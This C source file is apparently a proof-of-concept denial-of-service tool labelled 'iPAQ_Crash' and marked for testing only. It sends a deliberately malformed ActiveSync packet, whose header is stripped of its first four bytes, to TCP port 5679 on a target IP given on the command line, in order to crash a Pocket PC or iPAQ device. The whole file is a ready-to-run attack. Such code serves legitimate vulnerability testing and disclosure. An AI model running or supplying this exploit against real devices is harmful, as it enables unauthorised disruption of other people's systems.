/* iPAQ_Crash.c - by Andy Davis*/
/* Strictly for testing purposes only */
/* Compile with Microsoft VC++ */

#include <winsock.h>
#include <windows.h>
#include <stdio.h>

#define ASYNC_PORT 5679

int main(int argc, char **argv)
{

    unsigned char sendBuf[] =

/* Correct Header */

//"\x00\x00\x00\x00" /* Correct start of packet - by removing these 4
bytes the crash occurs */
"\x6e\x00\x00\x00" /* Length of the rest of the packet */
"\x24\x00\x00\x00"
"\x03\x00\xa3\x2b"
"\x11\x0a\x00\x00"
"\x00\x00\x00\x00"
"\xc3\x1d\xdd\x0c" /* 0xc31ddd0c Device Identifier */
"\x00\x00\x00\x00"
"\x24\x00\x00\x00" /* 0x24 pointer to "Pocket_PC" */
"\x38\x00\x00\x00" /* 0x38 pointer to "PocketPC" */
"\x4a\x00\x00\x00" /* 0x4a pointer to "Compaq iPAQ H3800" */

/* "Pocket_PC PocketPC Compaq iPAQ H3800" (in unicode) */

"\x50\x00\x6f\x00\x63\x00\x6b\x00\x65\x00\x74\x00"
"\x5f\x00\x50\x00\x43\x00\x00\x00\x50\x00\x6f\x00\x63\x00\x6b\x00"
"\x65\x00\x74\x00\x50\x00\x43\x00\x00\x00\x43\x00\x6f\x00\x6d\x00"
"\x70\x00\x61\x00\x71\x00\x20\x00\x69\x00\x50\x00\x41\x00\x51\x00"
"\x20\x00\x48\x00\x33\x00\x38\x00\x39\x00\x30\x00\x00\x00";


    struct sockaddr_in servAddr;
    int s;

		 WSADATA WSAData;
		 		 if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)
		 		 {
		 		 		 printf("WSAStartup failed.\n");
		 		 		 WSACleanup();
		 		 		 exit(1);
		 		 }


		 if (argc != 2)
		 {
		 		 printf ("\niPAQ_Crash\n");
		 		 printf ("\nUsage: %s <target IP address>\n",argv[0]);
		 		 exit (1);
		 }



    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.s_addr = inet_addr(argv[1]);
    servAddr.sin_port = htons(ASYNC_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *) &servAddr, sizeof(servAddr));

    printf("Sending packet...");

		 if ( send(s, sendBuf, 118, 0) == 0)
    {
		 		 printf("Error sending packet...quitting\n\n");
		 		 exit (0);
    }


    closesocket(s);
    return(0);

}